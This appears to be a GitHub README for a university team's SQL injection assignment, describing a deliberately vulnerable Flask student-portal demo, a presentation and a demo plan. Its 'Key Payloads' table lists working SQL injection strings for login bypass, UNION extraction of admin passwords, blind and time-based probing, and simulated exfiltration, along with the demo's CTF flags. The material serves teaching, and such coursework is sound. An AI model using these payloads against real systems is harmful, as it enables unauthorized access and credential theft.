# SQL Injection Attack — Cyber Security Assignment

### IIT Jodhpur | AI & Data Science | Team 10

> **FOR EDUCATIONAL PURPOSES ONLY** — The demo applications are deliberately vulnerable. Never deploy on a public server.

---

## Overview

This repository contains the complete deliverables for the Cyber Security group assignment on **SQL Injection Attack**, covering theory, hands-on demonstration, and countermeasures.

---

## Repository Contents

### Presentation

| File | Description |
|------|-------------|
| [Group_10_cyber_security_assignment_final.pptx](Group_10_cyber_security_assignment_final.pptx) | 16-slide presentation (PowerPoint) |
| [Group_10_cyber_security_assignment_final.pdf](Group_10_cyber_security_assignment_final.pdf) | 16-slide presentation (PDF version) |

### Demo Applications

| App | Description | Link |
|-----|-------------|------|
| **IIT Portal Simulation** | Flask web app simulating IIT Jodhpur student portal with In-Band, Blind, UNION, and OOB SQL injection vulnerabilities | [sqli_demo_app/](sqli_demo_app/) |
| **Secure Bank SQLi Demo** | Banking app demonstrating SQL injection with security countermeasures | [GitHub Repo](https://github.com/0xShashankbtc/SQL-Injection) |

### Documentation

| File | Description |
|------|-------------|
| [Readme.docx](Readme.docx) | Formatted document with all project links and team details |
| [sqli_demo_app/DEMO_PLAN.md](sqli_demo_app/DEMO_PLAN.md) | Step-by-step demo plan for all 3 SQLi types with exact payloads |

### Class Demo Recording

[Watch the demo recording on Zoom](https://futurense.zoom.us/rec/play/qNz941-Q10VxDpzjXNKcJhOC7XuUrnuppG_YK68naMeHwk_tkjTjCV6Aalp1bGKgkey0jX8W4lfMbIyR.wOmQS4J1hxyhZAd4)

---

## IIT Portal Simulation — Quick Start

```bash
cd sqli_demo_app

# Option 1: Using the one-click launcher (recommended for macOS)
chmod +x run.sh
./run.sh

# Option 2: Manual setup
pip install flask
python app.py

# Open in browser
# http://localhost:5000
```

### Demo Pages

| Route | Page | SQLi Type |
|-------|------|-----------|
| `/` | IIT Jodhpur Homepage | — |
| `/login` | Futurense-styled Login | **In-Band SQLi** (Error-based + Auth bypass) |
| `/profile?id=1` | Student Profile | **In-Band SQLi** (UNION-based) |
| `/search?roll=...` | Student Search | **Blind SQLi** (Boolean + Time-based) |
| `/oob_demo` | Notifications | **Out-of-Band SQLi** (Simulated exfiltration) |
| `/reset_db` | Reset database | Restores original data |

### Key Payloads

| Attack Type | Payload | Where |
|-------------|---------|-------|
| Auth Bypass | `' OR '1'='1' --` | Login page — Roll Number field |
| Error-Based | `'` | Login page — Roll Number field |
| UNION-Based | `/profile?id=0 UNION SELECT 1,username,password,role,secret_notes,6 FROM admin_users--` | Profile page URL |
| Boolean Blind | `' OR (SELECT substr(password,1,1) FROM admin_users WHERE username='admin')='S' --` | Search page |
| Time-Based Blind | `' OR CASE WHEN (SELECT substr(username,1,1) FROM admin_users LIMIT 1)='a' THEN sleep(3) ELSE 0 END --` | Search page |
| OOB Exfiltration | `' UNION SELECT exfiltrate(username \|\| ':' \|\| password) FROM admin_users--` | OOB Demo page |

### CTF Flags

| Flag | Location |
|------|----------|
| `IITJ{in_band_sqli_union_attack_success}` | `/profile` via UNION on `secret_flags` |
| `IITJ{blind_sqli_boolean_time_based_win}` | `/search` via boolean blind on `secret_flags` |
| `IITJ{out_of_band_exfiltration_complete}` | `/oob_demo` via OOB exfiltration |

---

## Topics Covered in Presentation

1. Introduction to SQL Injection
2. How SQL Injection Works
3. Types of SQL Injection (In-Band, Blind, Out-of-Band)
4. Real-World Breaches & Impact
5. Attack Methodology Deep Dive
6. Vulnerable vs. Secure Code
7. How `' OR 1=1 --` Works Internally (character-by-character breakdown)
8. Database Query Evaluation Logic
9. Countermeasures & Defense Strategies (Primary + Secondary)
10. Secure Coding Best Practices
11. Key Takeaways

---

## Group Members

| # | Name | Roll Number | Contribution |
|---|------|-------------|-------------|
| 1 | Khushi Bawistale | G25AIT2052 | Research, Presentation and demonstration of in-band SQLi injection |
| 2 | Soumya A | G25AIT2111 | Research and Presentation |
| 3 | Shashank Jangid | G25AIT2100 | Research, Demonstration of Inband SQLi injection in insecure and secure bank and Presentation |
| 4 | Rajath S M | G25AIT2079 | Research, Demonstration of Blind, UNION, OOB SQLi injection and Presentation |
| 5 | Siddhant Singh | G25AIT2105 | Research, Presentation and demonstration of In-band SQLi injection in IITJ simulated portal |
| 6 | Deepanshu Arora | G25AIT2029 | Research, Presentation and demo discussion |
| 7 | Shah Tirth Rajeshkumar | G25AIT2121 | Research, Presentation and hands on experience discussion |
